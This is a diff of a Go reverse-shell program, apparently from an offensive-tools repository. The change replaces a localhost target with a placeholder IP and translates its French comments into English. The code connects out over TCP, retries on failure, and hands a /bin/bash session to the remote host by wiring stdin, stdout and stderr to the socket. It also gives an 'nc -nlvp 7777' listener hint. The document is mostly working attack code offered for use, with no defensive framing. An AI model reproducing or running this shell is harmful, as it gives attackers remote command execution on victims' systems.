@@ -9,7 +9,7 @@ import (
 )
 
 func main() {
-	reverse_shell("127.0.0.1", "7777")
+	reverse_shell("AAA.AAA.AAA.AAA", "7777")
 }
 
 func pid() {
@@ -26,27 +26,27 @@ func reverse_shell(host string, port string) {
 	fmt.Println(full_conn)
 
 	conn, err := net.Dial("tcp", full_conn) // TCP call on IP:PORT
-	if err != nil {                         // verification des erreurs
+	if err != nil {                         // Errors verification
 		if nil != conn {
-			conn.Close() // ferme la connexion si err == nil et que la connexion est initialisee, permet de fermer proprement
+			conn.Close() // Close connexion in case of error
 		}
-		for i := 1; i <= 5; i++ { // la boucle ici pernet de relancer une connexion si cela echoue 5 tentatives avant de fermer la connexion
-			fmt.Fprintf(stderr, "ERREUR - Connexion a l'hote impossible\nPour essayer en local : nc -nlvp 7777\n")
+		for i := 1; i <= 5; i++ { // For loop to retry connexion for 5 times before exiting
+			fmt.Fprintf(stderr, "Host connexion impossible\nTo try in local, you can : nc -nlvp 7777\n")
 			time.Sleep(5 * time.Second)
 			reverse_shell(host, port)
 		}
-		fmt.Fprintf(stderr, "ECHEC - Connexion a l'hote impossible apres 5 essais\n")
-		os.Exit(1) // EXIT == 1 - Exit avec erreur
+		fmt.Fprintf(stderr, "EXITING - 5 failed connexions\n")
+		os.Exit(1)
 	}
-	fmt.Fprintf(stdout, "Connexion Reussie\n")
+	fmt.Fprintf(stdout, "Connexion up !\n")
 
-	sh := exec.Command("/bin/bash")                   // Execution d'un shell Bash
-	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn // multiples affectations des Std{in,out,err} aux pointeur conn pour tout rediriger dans le socket
-	sh.Run()                                          // execution du shell avec les redirections ci-dessus
+	sh := exec.Command("/bin/bash")                   // Execution of bash
+	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn // Redirect standard in/out/err to conn to redirect everything in the socket
+	sh.Run()                                          // Shell execution
 
-	conn.Close() // fermeture de la connexion lorsque le shell se ferme
+	conn.Close() // Clonnexion kill when shell is closed
 
-	fmt.Fprintf(stdout, "Connexion Fermee\n")
-	os.Exit(0) // EXIT == 0 - Exit sans erreur
+	fmt.Fprintf(stdout, "Connexion closed !\n")
+	os.Exit(0)
 
 }
